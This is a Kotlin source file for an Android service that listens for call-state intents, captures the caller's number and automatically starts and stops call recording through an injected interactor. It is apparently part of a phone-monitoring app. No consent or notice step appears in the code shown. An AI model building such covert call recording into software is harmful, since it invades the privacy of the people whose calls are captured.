package com.github.midros.istheapp.services.calls

import android.content.Intent
import android.util.Log
import com.github.midros.istheapp.services.base.BaseService
import com.github.midros.istheapp.utils.Consts.COMMAND_TYPE
import com.github.midros.istheapp.utils.Consts.PHONE_NUMBER
import com.github.midros.istheapp.utils.Consts.STATE_CALL_END
import com.github.midros.istheapp.utils.Consts.STATE_CALL_START
import com.github.midros.istheapp.utils.Consts.STATE_INCOMING_NUMBER
import com.github.midros.istheapp.utils.Consts.TYPE_CALL
import javax.inject.Inject

/**
 * Created by luis rafael on 13/03/18.
 */
class CallsService : BaseService(), InterfaceServiceCalls {
    private val TAG = "istheapp"

    private var phoneNumber: String? = null
    private var callType = 0

    @Inject
    lateinit var interactor: InterfaceInteractorCalls<InterfaceServiceCalls>

    override fun onCreate() {
        super.onCreate()
        if (getComponent() != null) {
            getComponent()!!.inject(this)
            interactor.onAttach(this)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.setCallIntent()
        return super.onStartCommand(intent, flags, startId)
    }

    private fun Intent.setCallIntent() {

        val commandType = getIntExtra(COMMAND_TYPE, 0)

        if (commandType != 0) {
            when (commandType) {
                STATE_INCOMING_NUMBER -> if (phoneNumber == null) {
                    phoneNumber = getStringExtra(PHONE_NUMBER)
                    callType = getIntExtra(TYPE_CALL, 0)
                    Log.i(TAG, "llamada entrante $phoneNumber")
                }
                STATE_CALL_START -> if (phoneNumber != null) {
                    Log.i(TAG, "llamada inicio  ")
                    interactor.startRecording(phoneNumber, callType)
                }
                STATE_CALL_END -> {
                    Log.i(TAG, "llamada fin ")
                    phoneNumber = null
                    interactor.stopRecording()
                }
            }
        }
    }

    override fun stopServiceCalls() {
        stopSelf()
    }

    override fun onDestroy() {
        interactor.onDetach()
        clearDisposable()
        super.onDestroy()
    }


}